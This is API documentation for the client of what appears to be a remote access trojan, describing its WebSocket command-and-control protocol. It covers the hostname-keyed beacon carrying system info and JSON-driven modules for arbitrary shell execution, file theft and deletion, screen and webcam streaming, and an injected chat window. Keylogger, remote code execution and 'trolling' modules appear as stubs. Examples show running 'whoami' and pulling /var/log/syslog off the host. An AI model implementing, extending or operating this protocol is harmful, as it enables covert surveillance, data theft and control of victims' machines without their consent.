# Client JSON API (v0 — matches current implementation)

**Transport:** WebSocket over **TLS** (`wss://{domain}:{port}/ws/{client_id}`), where `{client_id}` is `System::host_name()`.

* Immediately after the connection is established, the client sends **one `Text` frame** with system information (CSV-like string, **not JSON**):
  `"{host}, {os_short}, {os_long}, {kernel}, {cpu_model}, { {gpu1, gpu2} }, {mem_total}"`

* Server-to-client commands are always JSON in a `Text` frame:

```json
{
  "module": "MODULE_NAME",
  "args": { /* module-specific fields */ }
}
```

> `"module"` is the **feature name** used at build time:
> `"remote_cmd"`, `"files"`, `"remote_screen"`, `"webcam"`, `"chat"`, `"keylogger"`, `"remote_code_execution"`, `"trolling"`.
> A module is available only if the feature is enabled **and** the client registered it in the `Dispatcher`.

Client responses can be:

* `Text` (plain string)
* `Binary` (for webcam/screen frames and `files:DOWN`; formats described below)

---

## Modules

### 1) `remote_cmd`

Runs commands in a shell.

**Args**

| key     | type   | required | notes                                                                                 |
| ------- | ------ | -------- | ------------------------------------------------------------------------------------- |
| command | string | yes      | command line to execute                                                               |
| shell   | string | no       | `"powershell"`, `"bash"`, `"sh"`, or `"cmd"`; default: Windows=`cmd /C`, Unix=`sh -c` |

**Response**

* `Text`: concatenated `stdout || stderr` (decoded as UTF-8 lossy).

**Example**

```json
{ "module": "remote_cmd", "args": { "command": "whoami", "shell": "sh" } }
```

---

### 2) `files`

File/dir operations.

**Args**

| key       | type   | required | notes                                        |
| --------- | ------ | -------- | -------------------------------------------- |
| operation | string | yes      | `"GET"`, `"DEL"`, `"MOV"`, `"DOWN"`, `"RUN"` |
| path      | string | yes      | source path                                  |
| to        | string | for MOV  | destination path                             |

**Responses**

* `GET`:

  * if `path` is a file: `Text` = file contents (assumes UTF-8; binary files will garble)
  * if directory: `Text` = lines `"name (File|Dir)"`
* `DEL`: `Text` = `"OK deleted {path}"` or error string
* `MOV`: `Text` = `"OK moved"` or `"NO not moved: {err}"`
* `RUN`: `Text` = `"OK runned"` or `"NO not runned: {err}"`
* `DOWN`:

  * `Binary`: **raw ad-hoc format** — `filename` (UTF-8) + single byte `\n` (0x0A) + `{file_bytes}`
    **No length/version/CRC; `\n` in filename unsupported; not safe for arbitrary binary names.**

**Examples**

```json
{ "module": "files", "args": { "operation": "GET", "path": "/tmp" } }
{ "module": "files", "args": { "operation": "MOV", "path": "/tmp/a", "to": "/tmp/b" } }
{ "module": "files", "args": { "operation": "DOWN", "path": "/var/log/syslog" } }
```

---

### 3) `remote_screen`

Screenshot & streaming.

**Args**

| key         | type    | required | notes                                             |
| ----------- | ------- | -------- | ------------------------------------------------- |
| action      | string  | yes      | `"screenshot"`, `"stream_start"`, `"stream_stop"` |
| compressing | boolean | no       | default `true`                                    |

**Responses**

* `"screenshot"`: `Binary` frame:
  **format:** leading byte `0x02` + `payload`.
  `payload` = JPEG if `compressing=true`, otherwise raw RGB24.
* `"stream_start"`: starts periodic `Binary` frames with the same `0x02` prefix (about 10 FPS; hardcoded `frame_interval=100ms`).
* `"stream_stop"`: stops the stream.

**Examples**

```json
{ "module": "remote_screen", "args": { "action": "screenshot" } }
{ "module": "remote_screen", "args": { "action": "stream_start" } }
{ "module": "remote_screen", "args": { "action": "stream_stop" } }
```

---

### 4) `webcam`

Photo/video from the camera.

**Args**

| key         | type    | required | notes                                      |
| ----------- | ------- | -------- | ------------------------------------------ |
| mode        | string  | yes      | `"photo"`, `"video_start"`, `"video_stop"` |
| compressing | boolean | no       | for `"photo"`; default `true`              |

**Responses**

* `"photo"`: `Binary` frame: **format:** leading byte `0x01` + `payload` (JPEG if `compressing=true`, else RGB24).
* `"video_start"`: periodic `Binary` frames with `0x01` prefix (JPEG).
* `"video_stop"`: stops the stream.

**Examples**

```json
{ "module": "webcam", "args": { "mode": "photo" } }
{ "module": "webcam", "args": { "mode": "video_start" } }
{ "module": "webcam", "args": { "mode": "video_stop" } }
```

---

### 5) `chat`

Launches a local GUI chat window on the client.

**Args**

| key     | type   | required | notes                                 |
| ------- | ------ | -------- | ------------------------------------- |
| action  | string | yes      | `"start"`, `"send"`, `"stop"`         |
| message | string | for send | message text (from **host** into GUI) |

**Behavior & Responses**

* `"start"`: spawns the GUI window; **no explicit ACK** is sent back.
* `"send"`: appends a **host-authored** message into the local GUI; **no ACK**.
* User-typed messages from the GUI are sent back to the server as `Text` JSON:

  ```json
  { "type": "chat_message", "author": "client", "text": "..." }
  ```
* `"stop"`: closes the GUI and clears state; **no ACK**.

**Examples**

```json
{ "module": "chat", "args": { "action": "start" } }
{ "module": "chat", "args": { "action": "send", "message": "Hello!" } }
{ "module": "chat", "args": { "action": "stop" } }
```

---

### 6) `keylogger` — **stub**

Feature exists; actor is a no-op.

**Args (planned, not implemented)**
`action`: `"start" | "stop" | "dump"` — currently **not implemented**.

---

### 7) `remote_code_execution` — **stub**

Actor declared; `handler` is `todo!()`.

---

### 8) `trolling` — **stub**

Actor declared; `handler` is `todo!()`.

---

## Errors & edge cases (current behavior)

* If a module isn’t registered (feature disabled or not added in `Dispatcher`), the client **does not** send a structured error; it logs locally and the server gets **no response**.
* Most module errors are plain `Text` strings (`"NO not moved: …"`, etc.). There is **no unified error schema**.
* Binary streams (`webcam`, `remote_screen`) are **unframed** beyond a single-byte prefix (`0x01`/`0x02`); no length/version/CRC.
* `files:DOWN` uses a **fragile** format: `"name\nbytes"`. UTF-8/binary newline in names will break it.

---

## Quick reference (module strings)

```
remote_cmd
files
remote_screen
webcam
chat
keylogger              (stub)
remote_code_execution  (stub)
trolling               (stub)
```

---
